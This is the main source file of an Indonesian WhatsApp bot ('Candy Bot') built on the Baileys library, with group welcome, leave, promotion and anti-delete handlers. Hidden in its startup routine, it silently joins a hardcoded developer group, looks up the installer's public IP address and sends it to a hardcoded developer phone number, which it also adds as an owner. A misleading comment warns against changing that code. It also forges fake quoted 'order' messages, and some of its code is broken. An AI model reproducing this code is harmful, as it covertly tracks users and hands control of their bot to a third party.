const { WAConnection: _WAConnection, MessageType, Presence, Mimetype, ChatModification, GroupSettingChange, ReconnectMode } = require('@adiwajshing/baileys')
const simple = require('./lib/simple.js')
const WAConnection = simple.WAConnection(_WAConnection)
const nathan = new WAConnection()
const qrcode = require("qrcode-terminal")
const moment = require("moment-timezone")
const fs = require("fs")
const dfrply = fs.readFileSync('./logoku.jpg')
const util = require('util')
const figlet = require('figlet')
const term = require('terminal-kit').terminal
const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
const fetch = require('node-fetch')
const { color, bgcolor } = require('./lib/color')
const { exec } = require('child_process')
const { wait, simih, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const settings = JSON.parse(fs.readFileSync('./settings.json'))
const sleep = async (ms) => {
return new Promise(resolve => setTimeout(resolve, ms))
}
nocache('./nathan.js', module => console.log(color('[ UPDATE ]'), color(`${module} Updated!`, 'cyan')))

async function starts() {
nathan.autoReconnect = ReconnectMode.onConnectionLost
    nathan.version = [2 ,2143 ,3]
    nathan.logger.level = 'warn'
    nathan.browserDescription = ['Candy Bot','Desktop','3.0']
    await sleep(10000)
    nathan.on('qr', qr => {
        qrcode.generate(qr, { small: true })
        console.log(color('[ Code Siap ]'), color('Scan Kodenya', 'red'))
    })
    fs.existsSync('./QR.json') && nathan.loadAuthInfo('./QR.json')
    
    nathan.on('credentials-updated', () => {
        console.log(color('[ UPDATE ]'), color('credentials updated!', 'cyan'))
        })
     
      await nathan.connect({ timeoutMs: 30 * 1000 });
  fs.writeFileSync("./QR.json",JSON.stringify(nathan.base64EncodedAuthInfo(), null, "\t"));
 teks = `https://chat.whatsapp.com/FTvfxlLed2XGhjjaKF67os` //JANGAN DI GANTI NANTI ERROR
 teks = `https://chat.whatsapp.com/FTvfxlLed2XGhjjaKF67os` //JANGAN DI GANTI NANTI ERROR
 nathan.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
 console.log(color('[ Joined ] ', 'yellow'), color('Bergabung ke Grup ZEROBOT OFFICIAL', 'cyan'))
 nathan.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*Hai Owner ${settings.NamaBot}, Bot Telah Tersambung Ke Database Bot Ini*\n────────────────────\n\`\`\`${JSON.stringify(nathan.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 999, isForwarded: true, externalAdReply:{title: "Chat Automatic Nathan",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./logoku.jpg'),sourceUrl:"https://youtube.com/c/ZEROBOT7"}}})
	console.log(color('[ Info IP ]', 'yellow'), color('Sending Bot Info To Owner', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       nathan.sendMessage("6287834993722@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────\nNote : IP ADDRESS ADALAH KODE PENUKARAN, *HARAP SIMPAN BAIK BAIK*`, MessageType.text, {contextInfo: { forwardingScore: 999, isForwarded: true, externalAdReply:{title: "IP ADDRESS",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./logoku.jpg'),sourceUrl:"https://youtube.com/c/ZEROBOT7"}}})
     console.log(color('[ INFO ]', 'yellow'), color('Sending IP ADDRESS To Developer Bot', 'red'))
   })
      
    nathan.on('connecting', () => {
		console.log(color('[ Check Sinyal ]'), color('Connecting, Pastikan Jaringan Bagus...', 'cyan'))
		})
	
	nathan.on('open', () => {
	console.log(color('[ Terhubung ]'), color('Connected, Ketik .menu Di Whatsapp Bot Anda..!!', 'cyan'))
	}) 
     
    nathan.on('ws-close', () => {
        console.log(color('[ Sinyal Terputus ]'), color('Connection Lost, Trying To Reconnect.', 'cyan'))
        })
    
    nathan.on('close', async () => {
        console.log(color('[ Terputus ]'), color('Disconnected.', 'cyan'))
        })
    
	if (!settings.autoplaymusic) {
exec(`cd /sdcard/download && play *mp3`)
}
   
   nathan.on('chat-update', async (mek) => {
        require('./nathan.js')(nathan, mek)
        ownerNumber = ["6287834993722@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
        dtod = "6287834993722@s.whatsapp.net"
       otod = `${settings.NomorOwner}@s.whatsapp.net`
    })   
        nathan.on('group-participants-update', async (anu) => {
           mem = anu.participants[0]
			const mdata = await nathan.groupMetadata(anu.jid)
		    try {
			console.log(anu)
			if (anu.action == 'add') {
			ftroli = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "6287834993722-1621306547@g.us",
  },
  message: {
    orderMessage: {
      itemCount: 99999,
      status: 200,
      thumbnail: dfrply,
      surface: 200,
      message: `Selamat Datang Kak @${num.split('@')[0]}`,
      orderTitle: "Nathan.",
      sellerJid: "0@s.whatsapp.net",
    },
  },
  contextInfo: { forwardingScore: 99999, isForwarded: true },
  sendEphemeral: true,
};
		    num = anu.participants[0]
			try {
			ppimg = await nathan.getProfilePicture(`${num.split('@')[0]}@c.us`)
			} catch {
			ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
			}
			let buff = await getBuffer(ppimg)
			const baten = [{buttonId: `i`, buttonText: {displayText: 'Selamat Datang Kak'}, type: 1}]
			const bebek = {
			headerType: "IMAGE",
			contentText: `Halo @${num.split('@')[0]}\nSelamat Datang Di ${mdata.subject}\nIntro Kak\n*Nama* :\n*Umur* :\n*Kelas* :\n Semoga Betah Kak 😉 `,
			footerText: 'Welcome',
			buttons: baten,
			headerType: 1
			}
            nathan.sendMessage(mdata.id, bebek, MessageType.buttonsMessage, {quoted: ftroli, thumbnail: fs.readFileSync(`./logoku.jpg`), "mentionedJid": [num], contextInfo: { forwardingScore: 99999, isForwarded: true }});
			} else if (anu.action == 'remove') {
			ftroli = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "6287834993722-1621306547@g.us",
  },
  message: {
    orderMessage: {
      itemCount: 99999,
      status: 200,
      thumbnail: dfrply,
      surface: 200,
      message: `Sayonara Kak @${num.split('@')[0]}`,
      orderTitle: "Nathan.",
      sellerJid: "0@s.whatsapp.net",
    },
  },
  contextInfo: { forwardingScore: 99999, isForwarded: true },
  sendEphemeral: true,
};
			num = anu.participants[0]
			try {
			ppimg = await nathan.getProfilePicture(`${num.split('@')[0]}@c.us`)
			} catch {
			ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
			}
			let buff = await getBuffer(ppimg)
     const baten = [{buttonId: `i`, buttonText: {displayText: 'Selamat Tinggal Kak'}, type: 1}]
			const bebek = {
			headerType: "IMAGE",
			contentText: `Selamat Tinggal Kak
@${num.split('@')[0]}\nSemoga Tenang Di Alam Sana`,
			footerText: 'Sayonara',
			buttons: baten,
			headerType: 1
			}
            nathan.sendMessage(mdata.id, bebek, MessageType.buttonsMessage, {quoted: ftroli, thumbnail: fs.readFileSync(`./logoku.jpg`), "mentionedJid": [num], contextInfo: { forwardingScore: 99999, isForwarded: true }});
			} else if (anu.action == 'promote') {
ftroli = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "6287834993722-1621306547@g.us",
  },
  message: {
    orderMessage: {
      itemCount: 99999,
      status: 200,
      thumbnail: dfrply,
      surface: 200,
      message: `Selamat Kak @${num.split('@')[0]}`,
      orderTitle: "Nathan.",
      sellerJid: "0@s.whatsapp.net",
    },
  },
  contextInfo: { forwardingScore: 99999, isForwarded: true },
  sendEphemeral: true,
};
num = anu.participants[0]
teks = `*PROMOTE - DETECTED*\nUser: @${num.split('@')[0]}\nTime : ${moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')}\nGroup: ${mdata.subject}\n\nSelamat Anda Menjadi Babu Admin 🤗`
nathan.sendMessage(mdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [num]}, quoted: froli})
console.log(color('[ Promote ]'), color(`Promote ${num.split('@')[0]} In ${mdata.subject}`,  'cyan'))
} 
else if (anu.action == 'demote') {
ftroli = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "6287834993722-1621306547@g.us",
  },
  message: {
    orderMessage: {
      itemCount: 99999,
      status: 200,
      thumbnail: dfrply,
      surface: 200,
      message: `Selamat Kak @${num.split('@')[0]}`,
      orderTitle: "Nathan.",
      sellerJid: "0@s.whatsapp.net",
    },
  },
  contextInfo: { forwardingScore: 99999, isForwarded: true },
  sendEphemeral: true,
};
num = anu.participants[0]
teks = `*DEMOTE - DETECTED*\nUser: @${num.split('@')[0]}\nTime : ${moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')}\nGroup: ${mdata.subject}\n\nSelamat Anda Menjadi Member Biasa..!!`
nathan.sendMessage(mdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [num]}, quoted: ftroli})
console.log(color('[ Demote ]'), color(`Demote ${num.split('@')[0]} In ${mdata.subject}`,  'cyan'))
}
		    } catch (e) {
			console.log('Error : %s', color(e, 'red'))
		    }
	        })	       
	nathan.on('group-update', async (anu) => {
		const medata = await nathan.groupMetadata(anu.jid)
    	const ftroli = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "6287834993722-1621306547@g.us",
  },
  message: {
    orderMessage: {
      itemCount: 99999,
      status: 200,
      thumbnail: dfrply,
      surface: 200,
      message: `Sayonara Kak @${num.split('@')[0]}`,
      orderTitle: "Nathan.",
      sellerJid: "0@s.whatsapp.net",
    },
  },
  contextInfo: { forwardingScore: 99999, isForwarded: true },
  sendEphemeral: true,
};
    if(anu.announce == 'false'){
    teks = `[ Group Opened ]\n_Group Telah Dibuka Oleh Admin Group_\nSemua Anggota Dapat Mengirim Pesan Sekarang_`
    nathan.sendMessage(medata.id, teks, MessageType.text, {quoted: ftroli})
    console.log(color('[ OPEN ]'), color(`Group Opened In ${medata.subject}`, 'cyan'))
  } 
  else if(anu.announce == 'true'){
    teks = `[ Group Closed ]\n_Group Telah Ditutup Sementara_\n_Group Akan Dibuka Kemungkinan Sebentar Lagi_`
    nathan.sendMessage(medata.id, teks, MessageType.text, {quoted: ftroli})
    console.log(color('[ CLOSE ]'), color(`Group Closed In ${medata.subject}`,  'cyan'))
  }
  else if(!anu.desc == ''){
    tag = anu.descOwner.split('@')[0] + '@s.whatsapp.net'
    teks = `[ Description Change ]\nDeskripsi Group Telah Diubah Oleh @${anu.descOwner.split('@')[0]}\n• Deskripsi Baru : ${anu.desc}`
    nathan.sendMessage(medata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [tag]}, quoted: ftroli})
    console.log(color('[ DESKRIPSI ]'), color(`Group Description Change In ${medata.subject}`, 'cyan'))
  }
  else if(anu.restrict == 'false'){
    teks = `[ Group Setting Change ]\nEdit Info\nSemua Anggota Dapat Mengedit Info Group Ini`
    nathan.sendMessage(medata.id, teks, MessageType.text, {quoted: ftroli})
    console.log(color('[ SETTING ]'), color(`Group Setting Change In ${medata.subject}`, 'cyan'))
  }
  else if(anu.restrict == 'true'){
    teks = `[ Group Setting Change ]\nEdit Info\nHanya Admin Yang Dapat Mengedit Info Group Ini`
    nathan.sendMessage(medata.id, teks, MessageType.text, {quoted: ftroli})
    console.log(color('[ SETTING ]'), color(`Group Setting Change In ${medata.subject}`,  'cyan'))
  }
})

nathan.on('CB:action,,call', async json => {
        const callerId = json[2][0][1].from;
        var vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + `${NamaOwner}` + '\n' + `ORG:Developer ${NamaBot}\n` + 'TEL;type=CELL;type=VOICE;waid=' + `${NomorOwner}` + ':+' + `${NomorOwner}` + '\n' + 'END:VCARD'
        nathan.sendMessage(callerId, "\`\`\`[ ! ] CALL DETECTED [ ! ]\`\`\`\n\n\`\`\`Anda Telah Di Blokir Karena Telepon Bot , Silahkan Hubungi Developer Bot Untuk Membuka Blokir\`\`\`", MessageType.text)
        nathan.sendMessage(callerId, { displayname: `${NamaOwner}`, vcard: vcard}, MessageType.contact, {contextInfo: { externalAdReply:{title: `Developer ${NamaBot}`,body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./logoku.jpg'),sourceUrl:`https://youtube.com/c/ZEROBOT7`}}})
        await sleep(5000)
        await nathan.blockUser(callerId, "add")
        })
        
	nathan.on('message-delete', async (m) => {
if (m.key.remoteJid == 'status@broadcast') return
if (!m.key.fromMe) {
m.message = (Object.keys(m.message)[0] === 'ephemeralMessage') ? m.message.ephemeralMessage.message : m.message
const jam = moment.tz('Asia/Jakarta').format('HH:mm:ss')
let d = new Date
let c = nathan.chats.get(m.key.remoteJid)
let a = c.messages.dict[`${m.key.id}|${m.key.fromMe ? 1 : 0}`]
let co3ntent = nathan.generateForwardMessageContent(a, false)
let c3type = Object.keys(co3ntent)[0]
let locale = 'id'
let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
let weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
let week = d.toLocaleDateString(locale, { weekday: 'long' })
let date = d.toLocaleDateString(locale, {
day: 'numeric',
month: 'long',
year: 'numeric'
})
nathan.copyNForward(m.key.remoteJid, m.message)
nathan.sendMessage(m.key.remoteJid, `▷\`\`\`Anti Delete\`\`\`

\`\`\`Nama : @${m.participant.split("@")[0]}\`\`\`
\`\`\`Tipe : ${c3type}\`\`\`
\`\`\`Tanggal : ${jam} - ${week} ${weton} - ${date}\`\`\``, MessageType.text, {quoted: m.message, contextInfo: {"mentionedJid": [m.participant]}})
}
})
}

console.clear()
var progressBar , progress = 0 ;
function doProgress()
{
	progress += Math.random() / 10 ;
	progressBar.update( progress ) ;
	
	if ( progress >= 1 )
	{
		setTimeout( function() { console.clear(),
		exec(`screenfetch -A Deepin`, (error, stdout, stderr) => {
			console.log(stdout), console.log(bgcolor('Candy BOT', 'red'))})}, 200 ) ;
	}
	else
	{
		setTimeout( doProgress , 100 + Math.random() * 150 ) ;
	}
}
console.log(color(figlet.textSync(`${settings.NamaBot}`, {
		font: 'Standard',
		horizontalLayout: 'default',
		vertivalLayout: 'default',
		width: 50,
		whitespaceBreak: true
	    }), 'lightgreen')), term.slowTyping('CANDY BOT BY NATHAN' ,{ flashStyle: term.brightWhite })
progressBar = term.progressBar( {
	width: 80 ,
	title: '\n\nWait Proces' ,
	eta: true ,
	percent: true
} ) ;
doProgress() ;

/**
 * Uncache if there is file change
 * @param {string} module Module name or path
 * @param {function} cb <optional> 
 */
function nocache(module, cb = () => { }) {
    fs.watchFile(require.resolve(module), async () => {
        await uncache(require.resolve(module))
        cb(module)
    })
}
/**
 * Uncache a module
 * @param {string} module Module name or path
 */
function uncache(module = '.') {
    return new Promise((resolve, reject) => {
        try {
            delete require.cache[require.resolve(module)]
            resolve()
        } catch (e) {
            reject(e)
        }
    })
}
starts()